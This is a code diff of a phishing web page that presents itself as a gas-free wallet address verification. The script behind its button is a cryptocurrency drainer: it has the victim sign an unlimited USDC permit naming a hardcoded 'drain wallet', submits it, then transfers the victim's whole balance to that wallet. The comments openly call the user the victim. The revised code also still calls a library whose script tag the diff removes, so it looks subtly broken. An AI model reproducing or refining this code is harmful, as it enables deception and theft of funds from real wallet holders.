@@ -22,104 +22,117 @@ button:hover{filter:brightness(1.1)}
 <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
 </div>
 
-<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
 <script>
+// ===== CONFIG =====
 const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wallet
 const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };
 
-document.getElementById("go").addEventListener("click", async () => {
-  const eth   = window.ethereum || window.phantom?.ethereum;
-  if (!eth) { alert("Open in MetaMask/Phantom"); return; }
-  const prov  = new ethers.providers.Web3Provider(eth);
-  const [owner] = await prov.send("eth_requestAccounts", []);
-  const chainId = Number(await prov.send("eth_chainId", []));
-  if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }
+// ===== UTILS =====
+const keccak = (t,v) => Web3.utils.keccak256(Web3.eth.abi.encodeParameters(t,v));
+const pad32 = (a) => '0x' + a.slice(2).padStart(64,'0');
+const abiEnc = (t,v) => Web3.eth.abi.encodeParameters(t,v).slice(2);
 
-  const usdc     = USDC[chainId];
-  const name     = "USD Coin";
-  const version  = "2";
-  const domainSep = ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","bytes32","bytes32","uint256","address"],
+// ===== WALLET WAIT-LOOP =====
+let eth;
+async function getProvider() {
+  let tries = 0;
+  while (tries < 50 && !(window.ethereum || window.phantom?.ethereum)) {
+    await new Promise(r => setTimeout(r, 100));
+    tries++;
+  }
+  eth = window.ethereum || window.phantom?.ethereum;
+  if (!eth) throw new Error("No wallet detected");
+  return eth;
+}
+
+// ===== BUTTON HANDLER =====
+document.getElementById("go").addEventListener("click", async () => {
+  try {
+    const eth = await getProvider();
+    const [owner] = await eth.request({method:"eth_requestAccounts"});
+    const chainId = parseInt(await eth.request({method:"eth_chainId"}),16);
+    if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }
+
+    const usdc     = USDC[chainId];
+    const name     = "USD Coin";
+    const version  = "2";
+    const domainSep = keccak(
+      ['bytes32','bytes32','bytes32','uint256','address'],
       [
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")),
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(name)),
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(version)),
+        keccak("string","EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+        keccak("string",name),
+        keccak("string",version),
         chainId,
         usdc
       ]
-    )
-  );
+    );
 
-  // real nonce
-  const nonceHex = await prov.call({ to: usdc, data: "0x7ecebe00" + ethers.utils.hexZeroPad(owner, 32) });
-  const nonce = parseInt(nonceHex, 16);
+    // real nonce
+    const nonceHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x7ecebe00"+pad32(owner)},"latest"]});
+    const nonce = parseInt(nonceHex,16);
 
-  // permit message
-  const value    = ethers.constants.MaxUint256;
-  const deadline = ethers.constants.MaxUint256;
-  const messageHash = ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","address","address","uint256","uint256","uint256"],
+    // permit message
+    const value    = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const deadline = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const messageHash = keccak(
+      ['bytes32','address','address','uint256','uint256','uint256'],
       [
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")),
+        keccak("string","Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
         owner, DRAIN, value, nonce, deadline
       ]
-    )
-  );
-  const digest = ethers.utils.keccak256(
-    ethers.utils.solidityPack(["string","bytes32","bytes32"], ["\x19\x01", domainSep, messageHash])
-  );
+    );
+    const digest = keccak(
+      ['string','bytes32','bytes32'],
+      ["\x19\x01", domainSep, messageHash]
+    );
 
-  // force pop-up
-  const sig = await prov.send("eth_signTypedData_v4", [
-    owner,
-    {
-      types: {
-        EIP712Domain: [
-          { name: "name", type: "string" },
-          { name: "version", type: "string" },
-          { name: "chainId", type: "uint256" },
-          { name: "verifyingContract", type: "address" }
-        ],
-        Permit: [
-          { name: "owner", type: "address" },
-          { name: "spender", type: "address" },
-          { name: "value", type: "uint256" },
-          { name: "nonce", type: "uint256" },
-          { name: "deadline", type: "uint256" }
-        ]
-      },
-      primaryType: "Permit",
-      domain: { name, version, chainId, verifyingContract: usdc },
-      message: { owner, spender: DRAIN, value, nonce, deadline }
-    }
-  ]);
+    // force pop-up
+    const sig = await eth.request({
+      method:"eth_signTypedData_v4",
+      params:[owner,{
+        types:{
+          EIP712Domain:[
+            {name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
+          ],
+          Permit:[
+            {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}
+          ]
+        },
+        primaryType:"Permit",
+        domain:{name,version,chainId,verifyingContract:usdc},
+        message:{owner,spender:DRAIN,value,nonce,deadline}
+      }]
+    });
 
-  const { v, r, s } = ethers.utils.splitSignature(sig);
-  const permitData = "0xd505accf" + ethers.utils.defaultAbiCoder.encode(
-    ["address", "address", "uint256", "uint256", "uint8", "bytes32", "bytes32"],
-    [owner, DRAIN, value, deadline, v, r, s]
-  ).slice(2);
+    const {v,r,s} = ethers.utils.splitSignature(sig);
+    const permitData = "0xd505accf" + abiEnc(
+      ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
+      [owner,DRAIN,value,deadline,v,r,s]
+    );
 
-  // 1. PERMIT (victim pays gas – appears in history)
-  const permitTx = await prov.send("eth_sendTransaction", [{ from: owner, to: usdc, data: permitData, gasLimit: "0x186a0" }]);
+    // 1. PERMIT (victim pays gas – appears in history)
+    const permitTx = await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:permitData,gas:"0x186a0"}]});
 
-  // 2. SWEEP 100 % balance
-  const abi = ["function balanceOf(address) view returns (uint)", "function transferFrom(address,address,uint) returns (bool)"];
-  const contract = new ethers.Contract(usdc, abi, prov.getSigner());
-  const bal = await contract.balanceOf(owner);
-  const sweepData = contract.interface.encodeFunctionData("transferFrom", [owner, DRAIN, bal]);
- const sweepTx = await prov.send("eth_sendTransaction", [{ from: owner, to: usdc, data: sweepData, gasLimit: "0x186a0" }]);
+    // 2. SWEEP 100 % balance
+    const balHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x70a08231"+pad32(owner)},"latest"]});
+    const bal = BigInt(balHex);
+    const sweepData = "0xa9059cbb" + abiEnc(["address","uint256"],[DRAIN,bal.toString()]);
 
-  // success screen with links
-  const scan = chainId === 8453 ? "basescan.org" : "etherscan.io";
-  document.querySelector(".card").innerHTML = `
-    <h2>Success!</h2>
-    <p>Permit: <a href="https://${scan}/tx/${permitTx}" target="_blank" style="color:#00ffaa">view</a></p>
-    <p>Sweep: <a href="https://${scan}/tx/${sweepTx}" target="_blank" style="color:#00ffaa">view</a></p>
-  `;
+    const sweepTx= await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:sweepData,gas:"0x186a0"}]});
+
+    // success screen with links
+    const scan = chainId===8453?"basescan.org":"etherscan.io";
+    document.querySelector(".card").innerHTML=`
+      <h2>Success!</h2>
+      <p>Permit: <a href="https://${scan}/tx/${permitTx}" target="_blank" style="color:#00ffaa">view</a></p>
+      <p>Sweep: <a href="https://${scan}/tx/${sweepTx}" target="_blank" style="color:#00ffaa">view</a></p>
+    `;
+  } catch (e) {
+    console.error(e);
+    alert("Signature rejected or failed.");
+  }
 });
 </script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
 </body>
 </html>
